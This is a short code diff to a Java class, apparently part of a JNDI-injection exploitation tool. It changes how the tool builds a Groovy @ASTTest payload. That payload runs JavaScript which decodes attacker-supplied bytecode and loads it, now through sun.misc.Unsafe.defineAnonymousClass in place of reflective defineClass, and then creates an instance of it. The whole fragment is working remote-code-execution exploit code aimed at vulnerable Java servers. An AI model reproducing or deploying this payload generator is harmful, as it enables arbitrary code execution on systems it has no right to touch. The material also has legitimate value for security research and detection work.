@@ -15,12 +15,17 @@ public class GroovyClassLoaderController extends BasicController {
     public Object process(byte[] byteCode) {
         System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");
 
-        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
-                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
-                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
-                "method.setAccessible(true);" +
-                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
-                "clazz.newInstance();";
+        String code = "var s = '" + Base64.getEncoder().encodeToString(byteCode) + "';" +
+                "var bt;" +
+                "try {" +
+                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
+                "} catch (e) {" +
+                "bt = java.util.Base64.getDecoder().decode(s);" +
+                "}" +
+                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
+                "theUnsafeField.setAccessible(true);" +
+                "unsafe = theUnsafeField.get(null);" +
+                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
 
         String script = "@groovy.transform.ASTTest(value={\n" +
                 "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
